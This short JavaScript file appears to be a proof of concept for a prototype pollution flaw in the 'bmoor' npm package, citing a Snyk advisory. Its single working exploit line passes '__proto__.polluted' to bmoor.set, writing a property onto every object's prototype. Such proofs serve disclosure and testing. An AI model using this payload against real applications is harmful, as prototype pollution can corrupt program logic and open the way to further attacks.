//https://snyk.io/vuln/SNYK-JS-BMOOR-598664
 
   

  const bmoor = require("bmoor");
  bmoor.set({}, "__proto__.polluted", "yes");
// End of file
